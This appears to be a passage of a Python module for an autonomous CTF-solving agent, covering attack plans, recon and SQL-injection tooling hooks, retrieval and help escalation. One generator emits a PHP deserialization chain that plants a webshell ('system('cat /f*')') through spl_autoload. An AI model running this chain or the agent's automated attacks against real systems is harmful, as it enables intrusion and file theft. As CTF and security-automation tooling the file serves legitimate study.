# -*- coding: utf-8 -*-
"""
CTF Agent 自动化决策与执行模块 v2.1
=====================================

实现全自动解题流程：
- 自动决策下一步行动
- 持续解题直到成功或明确失败
- 即时反馈与报告
- 自动保存经验

使用方式:
    from agent_core import AutoAgent

    agent = AutoAgent()
    agent.solve_challenge(
        url="https://target.com",
        hint="有没有手机"
    )
"""

import hashlib
import re
import json
from urllib.parse import urljoin
from typing import Dict, List, Any, Optional, Callable, Set

from tools import (
    get_memory, reset_memory, execute_python_poc, execute_command,
    extract_flags, get_memory_summary, init_problem, get_agent_context,
    quick_dir_scan, sqlmap_scan_url, sqlmap_deep_scan_url, retrieve_rag_knowledge,
    summarize_auth_recon_response, summarize_generic_recon_findings,
    init_interaction, get_interaction_manager, check_user_guidance,
    write_agent_status, write_agent_completed, write_agent_aborted,
)
from long_memory import auto_save_experience
from graph_manager import GraphManager

# 引入源码分析器
try:
    from workspace.source_analyzer import analyze_php, format_analysis
    SOURCE_ANALYSIS_AVAILABLE = True
except ImportError:
    SOURCE_ANALYSIS_AVAILABLE = False

# LLM 配置（从 config.json 加载）
def _load_llm_config() -> dict:
    """从 config.json 加载 LLM 配置"""
    from pathlib import Path
    config_path = Path(__file__).parent / "config.json"
    if config_path.exists():
        try:
            cfg = json.loads(config_path.read_text(encoding="utf-8"))
            return cfg.get("llm", {})
        except (json.JSONDecodeError, IOError):
            pass
    return {}

_LLM_CONFIG = _load_llm_config()


class AttackStep:
    """攻击步骤"""
    def __init__(self, name: str, description: str, code: str = "",
                 depends_on: List[str] = None, required: bool = True):
        self.name = name
        self.description = description
        self.code = code
        self.depends_on = depends_on or []
        self.required = required
        self.completed = False
        self.result = None


class AgentNeedsHelpException(Exception):
    """Raised when the agent cannot proceed without human assistance."""

    def __init__(self, message: str):
        super().__init__(message)
        self.message = message


class AttackPlan:
    """攻击计划"""

    def __init__(self, vuln_type: str, target_url: str):
        self.vuln_type = vuln_type
        self.target_url = target_url
        self.steps: List[AttackStep] = []
        self.current_step = 0
        self.prerequisites: List[str] = []  # 攻击前提条件

    def add_step(self, step: AttackStep):
        """添加攻击步骤"""
        self.steps.append(step)

    def add_prerequisite(self, prereq: str):
        """添加攻击前提"""
        self.prerequisites.append(prereq)

    def get_next_step(self) -> Optional[AttackStep]:
        """获取下一个待执行的步骤"""
        for i, step in enumerate(self.steps):
            if not step.completed:
                # 检查依赖是否满足
                if step.depends_on:
                    deps_satisfied = all(
                        self.get_step_by_name(d).completed
                        for d in step.depends_on if self.get_step_by_name(d)
                    )
                    if not deps_satisfied:
                        continue
                self.current_step = i
                return step
        return None

    def get_step_by_name(self, name: str) -> Optional[AttackStep]:
        """通过名称获取步骤"""
        for step in self.steps:
            if step.name == name:
                return step
        return None

    def mark_step_completed(self, step_name: str, result: str = ""):
        """标记步骤完成"""
        step = self.get_step_by_name(step_name)
        if step:
            step.completed = True
            step.result = result

    def is_complete(self) -> bool:
        """检查是否所有必需步骤已完成"""
        return all(s.completed or not s.required for s in self.steps)

    def get_summary(self) -> str:
        """获取计划摘要"""
        lines = [f"[AttackPlan] {self.vuln_type} attack on {self.target_url}"]
        lines.append(f"Prerequisites: {self.prerequisites}")
        for i, step in enumerate(self.steps, 1):
            status = "✓" if step.completed else "○"
            lines.append(f"  {status} Step {i}: {step.name} - {step.description}")
        return "\n".join(lines)

class AttackPlanner:
    """
    攻击计划器

    根据漏洞类型和源码分析结果生成多步骤攻击计划
    """

    def create_plan(self, vuln_type: str, target_url: str,
                    source_analysis: Any = None) -> AttackPlan:
        """
        创建攻击计划

        Args:
            vuln_type: 漏洞类型
            target_url: 目标URL
            source_analysis: 源码分析结果

        Returns:
            AttackPlan 攻击计划对象
        """
        plan = AttackPlan(vuln_type, target_url)

        # 根据漏洞类型创建计划
        if vuln_type == "deserialization" and source_analysis:
            self._create_deserialization_plan(plan, source_analysis)
        elif vuln_type == "ua_bypass":
            self._create_ua_bypass_plan(plan)
        elif vuln_type == "sqli":
            self._create_sqli_plan(plan)
        elif vuln_type == "lfi":
            self._create_lfi_plan(plan)
        else:
            self._create_generic_plan(plan)

        return plan

    def _create_deserialization_plan(self, plan: AttackPlan, analysis: Any):
        """创建反序列化攻击计划"""
        patterns = {p.name for p in analysis.patterns}
        class_info = analysis.class_info[0] if analysis.class_info else None
        class_name = class_info.name if class_info else "main"

        # 检查是否是spl_autoload链
        has_full_chain = (
            "wakeup_config_control" in patterns and
            "destruct_file_write" in patterns and
            "destruct_with_unserialize" in patterns
        )

        if has_full_chain:
            plan.add_prerequisite("可控的unserialize_callback_func配置")
            plan.add_prerequisite("可写的.inc文件")

            # Step 1: 配置环境
            plan.add_step(AttackStep(
                name="configure_environment",
                description="设置unserialize_callback_func为spl_autoload",
                code=self._generate_step1_code(class_name),
                required=True
            ))

            # Step 2: 写入恶意代码
            plan.add_step(AttackStep(
                name="write_shell",
                description="通过__destruct写入webshell到settings.inc",
                code=self._generate_step2_code(class_name),
                depends_on=["configure_environment"],
                required=True
            ))

            # Step 3: 触发包含
            plan.add_step(AttackStep(
                name="trigger_include",
                description="反序列化不存在的类触发spl_autoload",
                code=self._generate_step3_code(class_name),
                depends_on=["write_shell"],
                required=True
            ))

            # Step 4: 验证flag
            plan.add_step(AttackStep(
                name="extract_flag",
                description="提取flag",
                depends_on=["trigger_include"],
                required=False
            ))

    def _generate_step1_code(self, class_name: str) -> str:
        """生成Step 1代码"""
        return f"""# Step 1: 配置环境 + 准备写入
import requests
import urllib.parse

base = "{class_name}"
settings = 'a:1:{{s:25:"unserialize_callback_func";s:12:"spl_autoload";}}'
# 写入PHP webshell
php_code = "<?php system('cat /f*');"
inner = f's:{{len(php_code)}}:"{{php_code}}"'

payload = f'O:4:"{class_name}":2:{{s:8:"settings";{{settings}}s:6:"params";s:{{len(inner)}}:"{{inner}}"}}'

url = base + "?data=" + urllib.parse.quote(payload)
r = requests.get(url, timeout=10, verify=False)
print(f"Step1 Status: {{r.status_code}}")
"""

    def _generate_step2_code(self, class_name: str) -> str:
        """生成Step 2代码"""
        return f"""# Step 2: 触发包含
import requests
import urllib.parse

base = "{class_name}"
# 反序列化不存在的类触发spl_autoload
payload = 'O:4:"{class_name}":2:{{s:8:"settings";a:1:{{s:25:"unserialize_callback_func";s:12:"spl_autoload";}}s:6:"params";s:19:"O:8:\"settings\":0:{{}}";}}'

url = base + "?data=" + urllib.parse.quote(payload)
r = requests.get(url, timeout=10, verify=False)
print(f"Step2 Response: {{r.text[:500]}}")
"""

    def _generate_step3_code(self, class_name: str) -> str:
        """生成Step 3代码（验证）"""
        return """# Step 3: 提取flag
import re
flags = re.findall(r'ctfshow{[^}]+}', r.text)
if flags:
    print(f"FLAG: {flags[0]}")
"""

    def _create_ua_bypass_plan(self, plan: AttackPlan):
        """创建UA绕过攻击计划"""
        plan.add_step(AttackStep(
            name="test_mobile_ua",
            description="测试Mobile UA",
            required=True
        ))
        plan.add_step(AttackStep(
            name="follow_redirect",
            description="跟随重定向",
            depends_on=["test_mobile_ua"],
            required=True
        ))

    def _create_sqli_plan(self, plan: AttackPlan):
        """创建SQL注入攻击计划"""
        plan.add_step(AttackStep(
            name="detect_sqli",
            description="检测SQL注入点",
            required=True
        ))
        plan.add_step(AttackStep(
            name="extract_data",
            description="提取数据",
            depends_on=["detect_sqli"],
            required=True
        ))

    def _create_lfi_plan(self, plan: AttackPlan):
        """创建文件包含攻击计划"""
        plan.add_step(AttackStep(
            name="test_lfi",
            description="测试文件包含",
            required=True
        ))

    def _create_generic_plan(self, plan: AttackPlan):
        """创建通用攻击计划"""
        plan.add_step(AttackStep(
            name="recon",
            description="信息收集",
            required=True
        ))
        plan.add_step(AttackStep(
            name="exploit",
            description="尝试利用",
            required=True
        ))


class AutoAgent:
    """
    全自动CTF解题Agent
    ==================

    核心设计理念：
    1. 永不中断：循环执行直到成功/明确失败
    2. 自动决策：基于输出和记忆决定下一步
    3. 即时反馈：拿到flag立即报告
    4. 自我修正：失败3次自动换策略

    Attributes:
        max_failures: 同一方法最大失败次数
        max_steps: 最大尝试步数
        verbose: 是否输出详细日志
    """

    def __init__(self, max_failures: int = 3, max_steps: int = 20, verbose: bool = True,
                 min_steps_before_help: Optional[int] = None):
        self.max_failures = max_failures
        self.max_steps = max_steps
        self.verbose = verbose
        self.memory = get_memory()
        self.agent_context = get_agent_context()
        self.init_result: Dict[str, Any] = {}
        self.target_url = ""
        self.target_type = "unknown"
        self.problem_classified = False
        self.current_step_num = 0
        self.last_action: Dict[str, Any] = {}
        self.last_result: str = ""
        self.source_code: str = ""
        self.source_analysis_result = None  # 存储源码分析结果
        self.attack_plan = None  # 存储攻击计划
        self.planner = AttackPlanner()  # 攻击计划器
        self.action_handlers = {
            "recon": self._execute_recon_action,
            "ua_test": self._execute_ua_test_action,
            "follow_redirect": self._execute_follow_redirect_action,
            "sqlmap_scan": self._execute_sqlmap_action,
            "sqlmap_deep_scan": self._execute_sqlmap_deep_action,
            "dir_scan": self._execute_dir_scan_action,
            "source_analysis": self._execute_source_analysis_action,
            "poc": self._execute_poc_action,
            "attack_step": self._execute_attack_step_action,
        }
        self.consecutive_help_triggers = 0
        self.last_help_reason: Optional[str] = None
        self.help_cooldown_remaining = 0
        self.step_budget_limit = max_steps
        self.graph_manager = GraphManager()
        self.pending_replan: Dict[str, Any] = {}
        self.last_replan: Dict[str, Any] = {}
        self.replan_exhausted_reason: Optional[str] = None
        if min_steps_before_help is None:
            self.min_steps_before_help = max(3, self.max_failures)
        else:
            self.min_steps_before_help = max(1, min_steps_before_help)

    def log(self, msg: str, level: str = "INFO"):
        """输出日志"""
        if self.verbose:
            prefix = f"[{level}]" if level else ""
            print(f"{prefix} {msg}")

    def initialize_challenge(self, url: str = "", hint: str = "", description: str = "",
                             source_code: str = "", interactive: bool = False) -> Dict[str, Any]:
        """初始化题目上下文，供 orchestrator 与旧入口复用。"""
        # 初始化交互管理器
        self.interactive = interactive
        if interactive:
            init_interaction(enabled=True)

        init_result = init_problem(target_url=url, description=description, hint=hint)
        self.memory = get_memory()
        self.init_result = init_result
        self.target_url = init_result.get("target_url", url)
        self.target_type = init_result.get("problem_type", "unknown")
        self.agent_context = get_agent_context()
        self.graph_manager.reset()
        self.pending_replan = {}
        self.last_replan = {}
        self.replan_exhausted_reason = None

        if hint:
            hinted_type = self._classify_problem(hint)
            init_confidence = float(init_result.get("classification_confidence") or 0.0)
            if hinted_type and hinted_type != init_result.get("problem_type") and init_confidence < 0.6:
                self.target_type = hinted_type
                self.memory.update_target(problem_type=self.target_type)
                self.memory.set_context(problem_type=self.target_type)
                self.agent_context = get_agent_context()
                self.init_result["problem_type"] = self.target_type
                self.init_result["classification_source"] = "hint-heuristic"

        if source_code and SOURCE_ANALYSIS_AVAILABLE:
            self.source_code = source_code
            self._analyze_source_code(source_code)
            if self.source_analysis_result:
                self._create_attack_plan()

        if self.target_type == "unknown" and self.source_analysis_result:
            self.target_type = self.source_analysis_result.vuln_type
            self.memory.update_target(problem_type=self.target_type)
            self.memory.set_context(problem_type=self.target_type)
            self.agent_context = get_agent_context()
            self.init_result["problem_type"] = self.target_type
            self.log(f"[Analysis] Auto-classified as: {self.target_type}")

        self._refresh_graph_state()
        return self.init_result

    def _sync_agent_context(self) -> None:
        """同步最新短期记忆上下文。"""
        self.agent_context = get_agent_context()

    def _refresh_graph_state(self) -> List[Dict[str, Any]]:
        """刷新 graph findings，并回写到 resume-safe context。"""
        shared_findings = self.graph_manager.refresh_shared_findings(self.memory)
        if hasattr(self.memory, "context"):
            self.memory.context.shared_findings = list(shared_findings)
        self._sync_agent_context()
        return shared_findings

    def _latest_memory_step_for_action(
        self,
        action: Dict[str, Any],
        step_num: Optional[int] = None,
    ) -> Optional[Any]:
        """获取当前 action 最接近的 memory step。"""
        action_id = str((action or {}).get("id", ""))
        step = self.memory.latest_step_for_action(action_id)
        if step is not None:
            return step
        if step_num is not None and self.memory.steps:
            candidate = self.memory.steps[-1]
            if getattr(candidate, "num", 0) == step_num:
                return candidate
        return None

    def _reset_help_cooldown(self) -> None:
        """恢复后降低再次立即求助的概率。"""
        self.consecutive_help_triggers = 0
        self.last_help_reason = None
        self.help_cooldown_remaining = 2

    def _latest_success_step_num(self) -> int:
        """返回最近一次成功 step 编号；若从未成功则为 0。"""
        for step in reversed(self.memory.steps):
            if step.success:
                return int(step.num or 0)
        return 0

    def _current_failure_window_anchor_step(self) -> int:
        """返回当前失败窗口锚点。"""
        return self._latest_success_step_num()

    def _should_run_rag_before_help(self) -> bool:
        """判断当前失败窗口是否需要先做一次主动 RAG。"""
        self._sync_agent_context()
        anchor_step = self._current_failure_window_anchor_step()
        if not getattr(self.agent_context, "rag_attempted_in_current_window", False):
            return True
        return int(getattr(self.agent_context, "rag_attempt_anchor_step", 0) or 0) != anchor_step

    def _build_rag_query(self) -> str:
        """基于当前上下文拼装主动检索问题。"""
        last_action = self.last_action or {}
        action_desc = str(last_action.get("description") or last_action.get("intent") or last_action.get("type") or "")
        graph_signals = self.graph_manager.planner_signals()
        parts: List[str] = []

        if self.target_type and self.target_type != "unknown":
            parts.append(f"题型: {self.target_type}")
        if self.target_url:
            parts.append(f"目标: {self.target_url}")
        if action_desc:
            parts.append(f"最近受阻动作: {action_desc}")

        known_endpoints = list(graph_signals.get("known_endpoints") or [])[:3]
        if known_endpoints:
            parts.append("已知端点: " + ", ".join(known_endpoints))

        known_parameters = list(graph_signals.get("known_parameters") or [])[:5]
        if known_parameters:
            parts.append("已知参数: " + ", ".join(known_parameters))

        failed_tools = list(graph_signals.get("failed_tools") or [])[:4]
        if failed_tools:
            parts.append("失败工具: " + ", ".join(failed_tools))

        guidance = str(getattr(self.agent_context, "human_guidance", "") or graph_signals.get("latest_guidance") or "").strip()
        if guidance:
            parts.append(f"人工提示: {guidance}")

        hint = str(getattr(self.agent_context, "hint", "") or "").strip()
        if hint:
            parts.append(f"题目提示: {hint}")

        if not parts:
            parts.append("当前自动解题受阻，需要补充相关利用思路")
        return "；".join(parts)

    def _summarize_rag_result(self, rag_result: Dict[str, Any]) -> str:
        """提取精简 RAG 摘要供下一轮规划消费。"""
        knowledge = list(rag_result.get("retrieved_knowledge") or [])
        snippets: List[str] = []
        for item in knowledge[:3]:
            item_type = str(item.get("type") or "unknown")
            content = str(item.get("content") or "").strip().replace("\n", " ")
            if content:
                snippets.append(f"[{item_type}] {content[:120]}")
        suggested = str(rag_result.get("suggested_approach") or "").strip()
        if suggested:
            snippets.append(f"建议: {suggested[:160]}")
        error = str(rag_result.get("error") or "").strip()
        if error and not snippets:
            snippets.append(f"RAG error: {error[:160]}")
        return " | ".join(snippets[:4])

    def _run_rag_before_help(self, step_num: int) -> bool:
        """在真正求助前执行一次主动 RAG，并把结果写回上下文。"""
        query = self._build_rag_query()
        graph_signals = self.graph_manager.planner_signals()
        attempted_methods = list(graph_signals.get("failed_tools") or [])
        if self.last_action:
            canonical_tool = self._canonical_tool_name(self.last_action)
            if canonical_tool and canonical_tool not in attempted_methods:
                attempted_methods.append(canonical_tool)

        rag_result = retrieve_rag_knowledge(
            query=query,
            vuln_type=self.target_type,
            target_url=self.target_url,
            attempted_methods=attempted_methods,
        )
        rag_summary = self._summarize_rag_result(rag_result)
        suggested_approach = str(rag_result.get("suggested_approach") or "").strip()
        anchor_step = self._current_failure_window_anchor_step()

        self.memory.set_context(
            rag_attempt_anchor_step=anchor_step,
            rag_attempt_step=step_num,
            rag_query=query,
            rag_summary=rag_summary,
            rag_suggested_approach=suggested_approach,
            rag_attempted_in_current_window=True,
        )
        self._sync_agent_context()
        self.log("[RAG] Help threshold reached, ran retrieval before escalating", "INFO")
        if rag_summary:
            self.log(f"[RAG] {rag_summary}", "INFO")
        return bool(rag_summary or suggested_approach or rag_result.get("retrieved_knowledge"))

    def resume_with_guidance(
        self,
        human_guidance: str,
        event_callback: Optional[Callable[[str, Dict[str, Any]], None]] = None,
    ) -> Dict[str, Any]:
        """在不重新初始化题目的前提下，基于人工提示继续主链。"""
        if not self.init_result:
            raise ValueError("Challenge not initialized. Call initialize_challenge() first.")

        guidance = human_guidance.strip()
        if not guidance:
            raise ValueError("human_guidance must not be empty")

        self._sync_agent_context()
        self.memory.apply_human_guidance(
            guidance=guidance,
            step=self.current_step_num,
            reason=self.last_help_reason or "resume",
        )
        self._sync_agent_context()
        self._reset_help_cooldown()
        resume_count = getattr(self.agent_context, "resume_count", 0)
        self.graph_manager.apply_graph_op(
            self.graph_manager.build_checkpoint_graph_op(
                "resume",
                metadata={"resume_count": resume_count},
            ),
            step=self.current_step_num,
            guidance=guidance,
            resume_count=resume_count,
        )
        self._refresh_graph_state()
        self._emit_event(
            event_callback,
            "resume",
            {
                "step": self.current_step_num,
                "guidance": guidance,
                "resume_count": resume_count,
            },
        )
        return self.run_main_loop(event_callback=event_callback, resume=True)

    def _emit_event(
        self,
        event_callback: Optional[Callable[[str, Dict[str, Any]], None]],
        stage: str,
        payload: Dict[str, Any],
    ) -> None:
        """向 orchestrator 发出阶段事件。"""
        if event_callback:
            event_callback(stage, payload)

    def _get_consecutive_failures(self) -> int:
        """返回当前连续失败次数。"""
        consecutive_failures = 0
        for step in reversed(self.memory.steps):
            if step.success:
                break
            consecutive_failures += 1
        return consecutive_failures

    def build_advisor_context(self) -> Dict[str, Any]:
        """构造 Advisor 阶段使用的上下文快照。"""
        shared_findings = self._refresh_graph_state()
        recent_steps = self.memory.steps[-3:]
        skill_content = self.init_result.get("skill_content") or getattr(self.agent_context, "skill_content", "")
        loaded_resources = self.init_result.get("loaded_resources") or self.init_result.get("resources") or {}
        help_history = list(getattr(self.agent_context, "help_history", [])[-3:])
        human_guidance = getattr(self.agent_context, "human_guidance", "")

        rag_summary = str(getattr(self.agent_context, "rag_summary", "") or "")
        rag_suggested_approach = str(getattr(self.agent_context, "rag_suggested_approach", "") or "")
        rag_query = str(getattr(self.agent_context, "rag_query", "") or "")
        rag_attempted_in_current_window = bool(getattr(self.agent_context, "rag_attempted_in_current_window", False))
        taxonomy_profile = dict(loaded_resources.get("taxonomy_profile") or {})
        resource_bundle = dict(loaded_resources.get("resource_bundle") or {})

        return {
            "target_url": self.target_url,
            "target_type": self.target_type,
            "hint": getattr(self.agent_context, "hint", ""),
            "problem_type": self.init_result.get("problem_type", self.target_type),
            "canonical_problem_type": str(taxonomy_profile.get("canonical_problem_type") or self.init_result.get("problem_type", self.target_type)),
            "classification_source": str(self.init_result.get("classification_source") or getattr(self.agent_context, "classification_source", "heuristic")),
            "classification_confidence": float(self.init_result.get("classification_confidence") or getattr(self.agent_context, "classification_confidence", 0.0) or 0.0),
            "classification_evidence": list(self.init_result.get("classification_evidence") or getattr(self.agent_context, "classification_evidence", []) or []),
            "classification_reasoning": str(self.init_result.get("classification_reasoning") or getattr(self.agent_context, "classification_reasoning", "") or ""),
            "taxonomy_tags": list(taxonomy_profile.get("taxonomy_tags") or []),
            "taxonomy_signals": {
                "type_aliases": list(taxonomy_profile.get("type_aliases") or []),
                "framework_tags": list(taxonomy_profile.get("framework_tags") or []),
                "vulnerability_tags": list(taxonomy_profile.get("vulnerability_tags") or []),
            },
            "resource_summary": {
                "skill_names": list(resource_bundle.get("skills") or taxonomy_profile.get("skill_names") or []),
                "type_aliases": list(taxonomy_profile.get("type_aliases") or []),
                "framework_tags": list(taxonomy_profile.get("framework_tags") or []),
                "resource_keys": sorted(resource_bundle.keys()),
                "experience_count": len(resource_bundle.get("experiences") or []),
                "poc_count": len(resource_bundle.get("pocs") or []),
                "wooyun_seed_count": len(resource_bundle.get("wooyun_seed_knowledge") or []),
                "has_skill_content": bool(skill_content),
            },
            "loaded_resources": loaded_resources,
            "skill_loaded": bool(skill_content),
            "skill_preview": skill_content[:200] if isinstance(skill_content, str) else "",
            "attack_plan_ready": bool(self.attack_plan),
            "consecutive_failures": self._get_consecutive_failures(),
            "memory_summary": get_memory_summary(),
            "human_guidance": human_guidance,
            "resume_count": getattr(self.agent_context, "resume_count", 0),
            "help_history": help_history,
            "shared_findings": shared_findings,
            "graph_summary": self.graph_manager.summary(),
            "latest_rag_query": rag_query,
            "latest_rag_summary": rag_summary,
            "latest_rag_suggested_approach": rag_suggested_approach,
            "rag_attempted_in_current_window": rag_attempted_in_current_window,
            "current_round": getattr(self.agent_context, "current_round", 1),
            "round_started_step": getattr(self.agent_context, "round_started_step", 0),
            "round_new_findings_count": getattr(self.agent_context, "round_new_findings_count", 0),
            "round_attempted_families": list(getattr(self.agent_context, "round_attempted_families", []) or []),
            "round_resource_sources_used": list(getattr(self.agent_context, "round_resource_sources_used", []) or []),
            "help_readiness_reason": str(getattr(self.agent_context, "help_readiness_reason", "") or ""),
            "recent_actions": [
                {
                    "tool": step.tool,
                    "target": step.target,
                    "success": step.success,
                }
                for step in recent_steps
            ],
        }

    def _build_decision_context(self) -> Dict[str, Any]:
        """
        构建 AI 决策所需的上下文。

        整合 memory、graph、resources 到统一上下文，供 AI 决策使用。
        这是 P0 优先级的基础方法。
        """
        shared_findings = self._refresh_graph_state()
        signals = self.graph_manager.planner_signals()

        # === 1. 目标信息 ===
        hint = getattr(self.agent_context, "hint", "") or "无"
        context = {
            "target_url": self.target_url,
            "problem_type": self.init_result.get("problem_type", self.target_type),
            "hint": hint,
            "hint_interpretation": self._interpret_hint(hint, self.init_result.get("problem_type", self.target_type)),
            "description": getattr(self.agent_context, "description", ""),
        }

        # === 2. 已发现线索（优先级排序）===
        priority_findings = signals.get("priority_findings", [])
        findings_summary = self._summarize_findings(priority_findings)
        context["findings_summary"] = findings_summary

        # === 3. 历史动作 ===
        action_history = self._summarize_action_history()
        context["action_history_summary"] = action_history

        # === 4. 失败分析 ===
        failure_summary = self._summarize_failures()
        context["failure_summary"] = failure_summary

        # === 5. 可用资源 ===
        resource_summary = self._summarize_resources()
        context["resource_summary"] = resource_summary

        # === 6. 可用工具 ===
        context["available_tools"] = self._get_available_tools()

        # === 7. 当前状态 ===
        context["current_state"] = {
            "steps_count": len(self.memory.steps),
            "consecutive_failures": self._get_consecutive_failures(),
            "round": getattr(self.agent_context, "current_round", 1),
        }

        # === 8. 安全约束 ===
        context["constraints"] = {
            "max_steps": self.max_steps,
            "max_failures": self.max_failures,
            "min_steps_before_help": self.min_steps_before_help,
        }

        return context

    def _summarize_findings(self, priority_findings: List[Dict]) -> str:
        """将 priority findings 总结为自然语言。"""
        if not priority_findings:
            return "暂无高价值发现"

        lines = []
        for f in priority_findings[:10]:  # 限制数量
            kind = f.get("kind", "")
            value = f.get("value", "")
            confidence = f.get("confidence", 0)
            lines.append(f"- [{kind}] {value} (置信度: {confidence})")

        return "高价值线索：\n" + "\n".join(lines)

    def _summarize_action_history(self) -> str:
        """将历史步骤总结为自然语言。"""
        steps = self.memory.steps
        if not steps:
            return "暂无历史动作"

        lines = []
        for step in steps[-10:]:  # 最近 10 步
            tool = step.tool
            target = step.target[:50] if step.target else ""
            success = "✓" if step.success else "✗"
            result_preview = str(step.result)[:80] if step.result else ""

            lines.append(f"{success} {tool}: {target}")
            if result_preview and not step.success:
                lines.append(f"  结果: {result_preview}")

        return "历史动作：\n" + "\n".join(lines)

    def _summarize_failures(self) -> str:
        """将失败步骤总结为自然语言，包含失败原因分析。"""
        steps = self.memory.steps
        failed_steps = [s for s in steps if not s.success]

        if not failed_steps:
            return "暂无失败记录"

        # 按工具分组统计失败
        tool_failures = {}
        for step in failed_steps:
            tool = step.tool
            if tool not in tool_failures:
                tool_failures[tool] = []
            tool_failures[tool].append(step)

        lines = []
        for tool, failures in tool_failures.items():
            count = len(failures)
            # 尝试提取失败原因
            reasons = set()
            for step in failures:
                result = str(step.result or "")
                if "密码错误" in result:
                    reasons.add("密码错误")
                elif "用户不存在" in result:
                    reasons.add("用户不存在")
                elif "无注入" in result.lower() or "not vulnerable" in result.lower():
                    reasons.add("无注入点")
                elif "404" in result:
                    reasons.add("页面不存在")
                elif "500" in result or "error" in result.lower():
                    reasons.add("服务器错误")

            reason_str = "，".join(reasons) if reasons else "未知原因"
            lines.append(f"- {tool}: 失败 {count} 次 ({reason_str})")

        return "失败分析：\n" + "\n".join(lines)

    def _summarize_resources(self) -> str:
        """总结当前可用的资源。"""
        loaded_resources = self.init_result.get("loaded_resources", {})
        resource_bundle = loaded_resources.get("resource_bundle", {})

        lines = []

        # === 1. Skill 内容（完整）===
        skill_content = self.init_result.get("skill_content", "")
        if skill_content:
            # 提取 skill 中的关键信息
            skill_summary = self._extract_skill_methods(skill_content)
            if skill_summary:
                lines.append(f"## 技能要点\n{skill_summary}")

        # === 2. 长期记忆经验 ===
        experiences = resource_bundle.get("experiences", [])
        if experiences:
            exp_lines = []
            for exp in experiences[:5]:  # 最多5条
                title = exp.get("title", "")
                method = exp.get("method", "")
                if title or method:
                    exp_lines.append(f"- {title}: {method}")
            if exp_lines:
                lines.append(f"## 历史经验\n" + "\n".join(exp_lines))

        # === 3. POC 信息 ===
        pocs = resource_bundle.get("pocs", [])
        if pocs:
            lines.append(f"## 可用 POC: {len(pocs)} 个")
            for poc in pocs[:3]:  # 最多3个
                poc_name = poc.get("name", "")
                poc_type = poc.get("type", "")
                if poc_name:
                    lines.append(f"- {poc_name} ({poc_type})")

        # === 4. WooYun 漏洞库知识 ===
        wooyun_knowledge = resource_bundle.get("wooyun_seed_knowledge", [])
        if wooyun_knowledge:
            woo_lines = []
            for kw in wooyun_knowledge[:3]:  # 最多3条
                title = kw.get("title", "")
                vuln_type = kw.get("vuln_type", "")
                if title:
                    woo_lines.append(f"- {title} ({vuln_type})")
            if woo_lines:
                lines.append(f"## WooYun 参考案例\n" + "\n".join(woo_lines))

        # === 5. 其他资源信息 ===
        if resource_bundle.get("skills"):
            lines.append(f"## 技能列表: {', '.join(resource_bundle['skills'])}")

        if not lines:
            return "暂无加载资源"

        return "\n\n".join(lines)

    def _extract_skill_methods(self, skill_content: str) -> str:
        """从 skill 内容中提取关键攻击方法。"""
        if not skill_content:
            return ""

        # 提取常见的攻击方法关键词
        key_methods = []

        content_lower = skill_content.lower()

        # 检测常见的攻击方法
        method_patterns = [
            ("弱口令", "weak_creds"),
            ("暴力破解", "brute_force"),
            ("SQL注入", "sqli"),
            ("SQL 注入", "sqli"),
            ("XSS", "xss"),
            ("跨站脚本", "xss"),
            ("命令执行", "rce"),
            ("代码执行", "rce"),
            ("文件上传", "upload"),
            ("文件包含", "lfi"),
            ("路径遍历", "path_traversal"),
            ("源码泄露", "source_leak"),
            (".git", "git"),
            (".svn", "svn"),
            ("IDOR", "idor"),
            ("越权", "idor"),
            ("JWT", "jwt"),
            ("session", "session"),
            ("cookie", "cookie"),
            ("反序列化", "deserialization"),
            ("unserialize", "deserialization"),
        ]

        for pattern, method_name in method_patterns:
            if pattern.lower() in content_lower:
                key_methods.append(method_name)

        # 去重并返回
        unique_methods = list(set(key_methods))
        if unique_methods:
            return f"关键攻击方法: {', '.join(unique_methods)}"

        return ""

    def _get_long_memory_context(self) -> str:
        """获取长期记忆中的相关经验。"""
        loaded_resources = self.init_result.get("loaded_resources", {})
        resource_bundle = loaded_resources.get("resource_bundle", {})

        lines = []

        # === 1. 历史经验（experiences）===
        experiences = resource_bundle.get("experiences", [])
        if experiences:
            for exp in experiences[:3]:  # 最多3条
                title = exp.get("title", "")
                method = exp.get("method", "")
                result = exp.get("result", "")
                if title:
                    lines.append(f"- {title}")
                    if method:
                        lines.append(f"  方法: {method}")
                    if result:
                        lines.append(f"  结果: {result}")

        # === 2. POC 信息 ===
        pocs = resource_bundle.get("pocs", [])
        if pocs:
            lines.append(f"\n可用 POC:")
            for poc in pocs[:3]:
                poc_name = poc.get("name", "")
                poc_desc = poc.get("description", "")
                if poc_name:
                    lines.append(f"- {poc_name}: {poc_desc}")

        if not lines:
            return "无相关历史经验"

        return "\n".join(lines)

    def _get_available_tools(self) -> Dict[str, Dict]:
        """返回工具语义库。"""
        return {
            "recon": {
                "适用": "需要了解目标页面内容",
                "输出": "页面结构、链接、参数、form",
                "局限": "只能访问已知页面",
            },
            "dirsearch": {
                "适用": "需要发现隐藏页面或目录",
                "输出": "目录、文件列表",
                "局限": "需要猜测路径字典",
            },
            "sqlmap": {
                "适用": "已确认存在 SQL 注入的参数",
                "输出": "数据库信息、数据",
                "局限": "需要已知注入点",
            },
            "python_poc": {
                "适用": "执行自定义攻击代码",
                "输出": "依赖 POC 实现",
                "局限": "需要编写 POC",
            },
            "source_analysis": {
                "适用": "分析提供的源码",
                "输出": "漏洞位置、代码逻辑",
                "局限": "需要提供源码",
            },
        }

    def _interpret_hint(self, hint: str, problem_type: str) -> str:
        """
        将 hint 转化为 AI 可理解的策略建议。
        基于常见 CTF 题型的 hint 模式进行匹配。
        """
        if not hint or hint == "无":
            return "无特殊提示"

        hint_lower = hint.lower()

        # 常见 hint 模式匹配
        interpretations = []

        # 通用模式
        if any(word in hint_lower for word in ["没有", "无", "不存在", "null"]):
            interpretations.append("常见方法可能不行，需要尝试其他攻击面")

        if any(word in hint_lower for word in ["弱", "weak", "password", "密码"]):
            interpretations.append("可能存在弱口令或默认密码")

        if any(word in hint_lower for word in ["admin", "管理员"]):
            interpretations.append("可能存在 admin 相关路径或用户")

        if any(word in hint_lower for word in ["源码", "source", "代码", "泄露"]):
            interpretations.append("可能存在源码泄露，尝试 .git、.svn 等")

        if any(word in hint_lower for word in ["注入", "sql", "sqli"]):
            interpretations.append("可能存在 SQL 注入")

        if any(word in hint_lower for word in ["文件", "file", "上传", "upload"]):
            interpretations.append("可能存在文件上传或包含漏洞")

        if any(word in hint_lower for word in ["xss", "脚本", "script"]):
            interpretations.append("可能存在 XSS 漏洞")

        if any(word in hint_lower for word in ["命令", "command", "rce", "执行"]):
            interpretations.append("可能存在命令执行漏洞")

